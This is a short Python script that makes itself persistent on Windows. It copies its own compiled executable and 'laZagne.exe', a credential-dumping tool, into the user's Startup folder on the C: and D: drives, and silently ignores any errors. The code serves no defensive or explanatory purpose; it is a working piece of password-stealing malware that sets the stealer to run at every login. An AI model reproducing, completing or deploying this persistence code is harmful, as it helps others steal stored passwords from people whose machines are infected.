import shutil
from getpass import getuser
import sys


file = sys.argv[0][::-1][3:][::-1] + 'exe'

def startup():
    print(file)

    try:
        shutil.copy(file, 'D:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % getuser())
        shutil.copy('laZagne.exe','D:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % getuser())
    except:
        pass

    try:
        shutil.copy(file, 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % getuser())
        shutil.copy('laZagne.exe', 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % getuser())
    except:
        pass